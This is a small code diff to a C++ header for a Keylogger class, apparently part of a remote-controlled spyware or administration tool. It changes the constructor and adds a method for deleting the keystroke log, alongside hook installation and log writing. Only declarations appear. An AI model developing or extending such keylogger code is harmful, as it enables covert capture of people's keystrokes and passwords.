@@ -22,7 +22,7 @@ public:
 	virtual void OnInit();
 	virtual void OnPacketArrived(BYTE*, size_t);
 	virtual void OnExit();
-	Keylogger(Connection*, WCHAR*);
+	Keylogger(Connection*);
 	~Keylogger();
 	bool			Start();
 	bool			Stop();
@@ -33,6 +33,7 @@ private:
 	bool			UnInstallHook();
 	bool			SetupLogFile();
 	bool			WriteLog(WCHAR*);
+	bool			DeleteLog();
 	bool			CloseLog();
 	WCHAR			logPath[MAX_PATH];
 	HWND			oldhWnd;
